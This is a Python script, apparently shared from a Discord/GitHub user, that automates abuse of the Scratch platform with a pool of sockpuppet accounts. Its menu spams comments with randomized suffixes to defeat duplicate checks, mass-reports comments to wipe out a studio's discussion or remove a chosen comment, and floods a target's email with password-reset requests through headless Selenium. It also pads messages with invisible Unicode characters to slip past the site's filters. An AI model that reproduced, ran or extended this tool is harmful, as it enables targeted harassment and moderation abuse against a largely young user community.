# js use start.bat

import scratchattach
import time
import random
import string
import threading
import requests
import aiohttp

accounts = []
sessions = []
global_threads = []

password = "example" # use this password if account doesnt have one
account_cooldown = 1.5 # time between logging into accounts (not even needed tbh)
_pfp = "example.jpg"

with open("accounts.txt", "r") as _accounts:
    for account in _accounts:
        account = account.strip().split(",")
        if len(account) < 2 or not account[1].strip() or len(account[1]) < 1:
            account.append(password)
        accounts.append({"username":account[0], "password":account[1].strip()})

class SpamSession():
    def __init__(self, username=None, password=None):
        self.username = username
        self.password = password
        self.cooldown = 33
        try:
            self.session = scratchattach.login(username, password)
        except Exception as e:
            self.session = scratchattach.Session()
            self.session.banned = True
        if self.session.new_scratcher:
            pass
        else:
            self.cooldown = 16
        self.connects = {
            "user": self.session.connect_user,
            "project": self.session.connect_project,
            "studio": self.session.connect_studio,
        }
        self._headers = self.session._headers
        self._cookies = self.session._cookies
        self.connected_to = []
        self.threads = []

    def set_pfp(self, username, session, pfp):
            from scratchcloud import CloudClient
            client = CloudClient(username=username, project_id='686861597')
            async def post_change_icon(client: CloudClient, icon):
                PATH = f'https://scratch.mit.edu/site-api/users/all/{client.username}/'
                with open(icon, 'rb') as img:
                    form = aiohttp.FormData()
                    form.add_field('thumbnail', img)
                    async with client.http_session.post(url=PATH, data=form) as response:
                        rdata = await response.json()
                        return rdata['thumbnail_url'].strip('//')
            import asyncio
            async def change_icon():
                try:
                    client = CloudClient(username=username, project_id=None)
                    await client.login(password)
                    await post_change_icon(client, pfp)
                    await client.close()
                except Exception as e:
                    client = CloudClient(username=username, project_id=None)
                    await client.login(password)
                    await post_change_icon(client, pfp)
                    await client.close()
            asyncio.run(change_icon())
        
    def rntas(self, original: str, length: int = 6) -> str:
        random_str = ''.join(random.choices(string.digits, k=length))
        return f"{original} {random_str}"

    def send_comment(self, target: scratchattach.Studio | scratchattach.User | scratchattach.Project, message: str):
        try:
            target.post_comment(self.rntas(message))
        except:
            pass

    def send_comment_to_connections(self, message: str):
        connect: scratchattach.Studio
        for connect in self.connected_to:
            for i in range(50):
                threading.Thread(target=self.send_comment,args=(connect, message)).start()

    def spam_comment(self, message, event: threading.Event):
        while event.is_set():
            self.send_comment_to_connections(message)
            time.sleep(self.cooldown)

    def report_comment(self, target: scratchattach.Comment): # apparently scratchattach already has comment.report but why would we wanna use that!
        source: str = target.source
        if source == "profile":
            source = "user"
        url = f"https://api.scratch.mit.edu/proxy/{source}/{str(target.source_id)}/comment/{target.id}/report"
        try:
            request = requests.post(url=url, data={"reportId": None}, headers=self._headers, cookies=self._cookies, timeout=20)
            if request.status_code == 200:
                pass
            else:
                print(f"error: {str(request.status_code)} {str(request.reason)}")
        except Exception as e:
            print(f"error: {e}")

    def report_comments(self, comments: list):
        for comment in comments:
            self.report_comment(comment)
            time.sleep(account_cooldown)

    def get_comment(self, source, id):
        connection = self.connect(source[0],source[1])
        return connection.comment_by_id(id)

    def report_in_connection(self):
        threading.Thread(target=self.report_comment, args=(self.connected_to[0].comments()[0],)).start()

    def is_banned(self):
        if self.session.banned:
            return True
        else:
            return False
        
    def connect(self, id: str, type: str):
        self.connected_to.append(self.connects.get(type)(id))
        return self.connected_to[len(self.connected_to)-1]

    def clear_connections(self):
        self.connected_to.clear()

def spam():
    _targets = input("targets (id,type): ").split(" ")
    message = input("message: ")
    targets = [target.split(",") for target in _targets]
    session: SpamSession
    event = threading.Event()
    event.set()
    for target in targets:
        for session in sessions:
            session.connect(target[0], target[1])
    print("ctrl+c to stop")
    try:
        for session in sessions:
            threading.Thread(target=session.spam_comment, args=(message, event)).start()
            time.sleep(account_cooldown)
    except KeyboardInterrupt:
        event.clear()
        print("stopping")
        init()


def mass_report():
    init()

def nuke_studio():
    target_id = input("target (id,type): ").split(",")
    for session in sessions:
        session.connect(target_id[0], target_id[1])
    print("ctrl+c to stop")
    try:
        while True:
            for session in sessions:
                session.report_in_connection()
            time.sleep(5)
    except KeyboardInterrupt:
        init()

def delete_comment():
    source = input("comment location (id,type): ").split(",")
    target = input("comment id: ")
    for session in sessions:
        try:
            session.report_comment(session.get_comment(source, target))
        except Exception:
            pass
    init()

def email_spam():
    threads = int(input("how many threads? (keep it low unless u have a very good pc) "))
    username = input("target: (username) ")
    print("ctrl+c to stop")
    from selenium.webdriver.common.by import By
    from selenium import webdriver
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.support import expected_conditions
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support.ui import Select
    from selenium.webdriver.common.proxy import Proxy, ProxyType

    options = Options()
    options.add_argument("--headless")
    options.add_argument("--window-size=1920,1080")
    options.add_argument(f'--user-agent=Mozilla/5.0 (Windows NT 4.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36')
    options.add_argument('--no-sandbox')
    options.add_argument("--disable-extensions")

    event = threading.Event()
    event.set()

    def new(name: str, event: threading.Event):
        test_driver = webdriver.Chrome(options=options)
        while event.is_set():
            test_driver.get('https://scratch.mit.edu/accounts/password_reset/')
            WebDriverWait(test_driver, 10).until(
                expected_conditions.presence_of_element_located((By.ID, "id_username"))
            )
            input_element = test_driver.find_element(By.ID, "id_username")
            input_element.send_keys(name)
            button = WebDriverWait(test_driver, 10).until(
                    expected_conditions.element_to_be_clickable((By.CLASS_NAME, "input-col-start"))
                )
            button.click()
            WebDriverWait(test_driver, 10).until(
                expected_conditions.url_to_be("https://scratch.mit.edu/accounts/password_reset_done/")
            )
        test_driver.quit()
    
    for i in range(1, threads+1):
        global_threads.append(threading.Thread(target=new, args=(username, event)))
        global_threads[len(global_threads)-1].start()

    try:
        while 1:
            time.sleep(0.1)
    except KeyboardInterrupt:
        event.clear()
        for i in global_threads:
            i.join()
        init()


def bypass():
    import pyperclip
    inp = input("message to bypass: ")
    chars = ["⁫","⁫","⁭","⁬","⁦",]
    pyperclip.copy("".join(f"{i}{random.choice(chars) * 4}" for i in inp))
    init()


def set_pfps():
    print("make sure u edited pfp at the top of the script")
    for session in sessions:
        threading.Thread(target=session.set_pfp, args=(session.username, session.session, _pfp)).start()
    init()

def list_sessions():
    _sessions = [session.username for session in sessions]
    print(_sessions)
    print(f"connected sessions: {len(_sessions)}")
    init()

def update_sessions():
    global sessions
    global accounts
    sessions.clear()
    accounts.clear()
    with open("accounts.txt", "r") as _accounts:
        for account in _accounts:
            account = account.strip().split(",")
            if len(account) < 2 or not account[1].strip() or len(account[1]) < 1:
                account.append(password)
            accounts.append({"username":account[0], "password":account[1].strip()})
    for info in accounts:
        sessions.append(SpamSession(info["username"], info["password"]))
    init()

def banned_sessions():
    banned = []
    for session in sessions:
        is_banned = session.is_banned()
        if is_banned:
            banned.append(session.username)
            print(f"{session.username} is banned")
    print(f"{str(len(banned))} banned accounts")
    init()

def clear_sessions():
    print("do not stop the script while ts is running or itll nuke ur accounts.txt")
    with open("accounts.txt", "w") as file:
        pass
    with open("accounts.txt", "a") as file:
        session: SpamSession
        for session in sessions:
            account = next((ac for ac in accounts if ac["username"] == session.username), None)
            is_banned = session.is_banned()
            if not is_banned:
                file.write(f"{account['username']},{account['password']}\n")
    init()

functions = {
    "1": spam,
    "2": mass_report,
    "3": nuke_studio,
    "4": delete_comment,
    "5": email_spam,
    "bypass": bypass,
    "pfp": set_pfps,
    "list": list_sessions,
    "update": update_sessions,
    "banned": banned_sessions,
    "clear": clear_sessions,
    "exit": exit,
}

def init():
    for session in sessions:
        session.clear_connections()
    selected = input("""
what do u wanna do?
main features:
1: spam
2: mass report (not added yet)
3: nuke studio's comments
4: delete a comment
5: email spam (LEAKS UR IP, USE VPN!!!) (set up selenium first cuz im stupid)

message-related features:
bypass: bypasses a message for u (pip install pyperclip first)

other:
pfp: sets all sessions pfps
list: lists all current sessions
update: adds new accounts to the script (if you add more to accounts.txt after starting the script)
banned: prints all banned accounts
clear: clears banned & wrong password'd accounts from accounts.txt
exit: closes the script

input: """).strip()
    selected = functions.get(selected)
    if selected:
        selected()
    else:
        print("invalid option")
        init()

if __name__ == "__main__":
    for info in accounts:
        sessions.append(SpamSession(info["username"], info["password"]))
    init()


# credits:
# aurafarmed on discord - https://github.com/iscariots/
